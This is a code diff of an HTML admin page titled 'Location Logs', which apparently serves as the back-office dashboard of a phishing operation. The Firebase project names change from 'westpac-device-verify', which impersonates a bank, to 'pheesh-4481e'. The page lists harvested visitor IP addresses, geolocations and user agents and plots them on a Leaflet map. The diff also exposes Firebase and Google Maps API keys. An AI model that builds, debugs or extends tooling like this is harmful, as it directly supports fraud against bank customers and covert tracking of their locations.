@@ -4,6 +4,10 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Location Logs - Admin View</title>
+    <!-- Leaflet CSS -->
+    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
+     integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY="
+     crossorigin=""/>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -96,24 +100,24 @@
     </div>
 
     <!-- Firebase SDK -->
-    <script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-app.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/9.x.x/firebase-database.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
     
-    <!-- Google Maps -->
-    <script async defer
-        src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDqWFUWwJx7XeGj3l6hZ-TPEvJHAQKP8Vo&callback=initMap">
-    </script>
+    <!-- Leaflet JS -->
+    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"
+     integrity="sha256-20nQCchB9co0qIjJZRGuk2/Z9VM+kNiyxNV1lvTlZBo="
+     crossorigin=""></script>
 
     <script>
-        // Firebase configuration (same as in script.js)
+        // Firebase configuration
         const firebaseConfig = {
             apiKey: "AIzaSyBqx_C7XqKjmgJqRHcXBW5K9zMGNBZyGDY",
-            authDomain: "westpac-device-verify.firebaseapp.com",
-            projectId: "westpac-device-verify",
-            storageBucket: "westpac-device-verify.appspot.com",
+            authDomain: "pheesh-4481e.firebaseapp.com",
+            databaseURL: "https://pheesh-4481e-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "pheesh-4481e",
+            storageBucket: "pheesh-4481e.appspot.com",
             messagingSenderId: "458791455321",
-            appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e",
-            databaseURL: "https://westpac-device-verify-default-rtdb.firebaseio.com"
+            appId: "1:458791455321:web:3a9b8e6f4b8e9f1b2c3d4e"
         };
 
         // Initialize Firebase
@@ -124,23 +128,26 @@
         let markers = [];
 
         function initMap() {
-            map = new google.maps.Map(document.getElementById('locationMap'), {
-                zoom: 2,
-                center: { lat: 0, lng: 0 }
-            });
+            // Initialize Leaflet map
+            map = L.map('locationMap').setView([0, 0], 2);
+            
+            // Add OpenStreetMap tile layer
+            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+                attribution: '© OpenStreetMap contributors'
+            }).addTo(map);
         }
 
         function refreshData() {
-            // Fetch real data from Firebase
+            // Clear existing markers
+            markers.forEach(marker => map.removeLayer(marker));
+            markers = [];
+
+            // Fetch data from Firebase
             database.ref('locations').orderByChild('timestamp').limitToLast(100).once('value')
                 .then(snapshot => {
                     const logsTable = document.getElementById('logsTable');
                     logsTable.innerHTML = '';
                     
-                    // Clear existing markers
-                    markers.forEach(marker => marker.setMap(null));
-                    markers = [];
-
                     snapshot.forEach(childSnapshot => {
                         const data = childSnapshot.val();
                         
@@ -152,11 +159,9 @@
                         row.insertCell(3).textContent = data.userAgent;
 
                         // Add marker to map
-                        const marker = new google.maps.Marker({
-                            position: { lat: data.latitude, lng: data.longitude },
-                            map: map,
-                            title: `${data.ip} - ${new Date(data.timestamp).toLocaleString()}`
-                        });
+                        const marker = L.marker([data.latitude, data.longitude])
+                            .bindPopup(`${data.ip}<br>${new Date(data.timestamp).toLocaleString()}`)
+                            .addTo(map);
                         markers.push(marker);
                     });
                 })
@@ -164,38 +169,13 @@
                     console.error('Error fetching data:', error);
                     alert('Error fetching data. Please try again.');
                 });
-            const dummyData = [
-                {
-                    timestamp: new Date().toISOString(),
-                    ip: '192.168.1.1',
-                    latitude: -41.2865,
-                    longitude: 174.7762,
-                    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
-                }
-            ];
-
-            const logsTable = document.getElementById('logsTable');
-            logsTable.innerHTML = '';
-            
-            dummyData.forEach(data => {
-                const row = logsTable.insertRow();
-                row.insertCell(0).textContent = new Date(data.timestamp).toLocaleString();
-                row.insertCell(1).textContent = data.ip;
-                row.insertCell(2).textContent = `${data.latitude}, ${data.longitude}`;
-                row.insertCell(3).textContent = data.userAgent;
-
-                // Add marker to map
-                const marker = new google.maps.Marker({
-                    position: { lat: data.latitude, lng: data.longitude },
-                    map: map,
-                    title: `${data.ip} - ${new Date(data.timestamp).toLocaleString()}`
-                });
-                markers.push(marker);
-            });
         }
 
-        // Initial load
-        document.addEventListener('DOMContentLoaded', refreshData);
+        // Initialize map and load data
+        document.addEventListener('DOMContentLoaded', () => {
+            initMap();
+            refreshData();
+        });
     </script>
 </body>
 </html>
